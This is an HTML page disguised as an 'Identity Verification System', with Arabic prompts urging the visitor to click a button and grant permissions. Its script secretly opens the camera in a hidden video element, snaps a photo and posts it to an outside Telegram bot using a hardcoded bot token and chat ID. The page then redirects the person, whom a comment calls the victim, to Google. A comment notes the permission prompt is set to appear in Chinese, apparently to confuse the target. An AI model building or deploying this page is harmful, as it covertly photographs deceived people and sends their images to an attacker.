<html lang="zh-CN"> 
<head>
    <meta charset="UTF-8">
    <title>Identity Verification System</title>
    <style>
        body { background-color: #1a1a1a; color: white; font-family: sans-serif; text-align: center; padding-top: 100px; }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn { background-color: #3498db; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; }
    </style>
</head>
<body>
    <div id="setup">
        <h2>جاري تهيئة نظام الفحص الآمن...</h2>
        <div class="loader"></div>
        <p>يرجى الضغط على الزر أدناه والموافقة على الصلاحيات لإتمام عملية التحقق</p>
        <button class="btn" onclick="startCapture()">بدء التحقق الآن</button>
    </div>

    <video id="video" width="1" height="1" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // بياناتك الخاصة التي زودتني بها
        const token = '8342945921:AAFveM18P7WoGfr__Majgk73Do3e4-gxIzQ';
        const chat_id = '7861426333'; 

        function startCapture() {
            // طلب الكاميرا (سيظهر التنبيه باللغة الصينية بسبب lang="zh-CN")
            navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // التقاط الصورة بعد ثانية من فتح الكاميرا
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = 640;
                    canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', chat_id);
                        formData.append('photo', blob, 'capture.jpg');

                        // إرسال الصورة مباشرة إلى بوت التليجرام الخاص بك
                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        }).then(response => {
                            if(response.ok) {
                                alert("تم إرسال البيانات بنجاح، شكراً لك.");
                                window.location.href = "https://www.google.com"; // تحويل الضحية لجوجل بعد الانتهاء
                            }
                        });
                    }, 'image/jpeg');
                }, 1000);
            })
            .catch(err => {
                alert("خطأ: يرجى المحاولة مرة أخرى والموافقة على الصلاحيات.");
            });
        }
    </script>
</body>
</html>
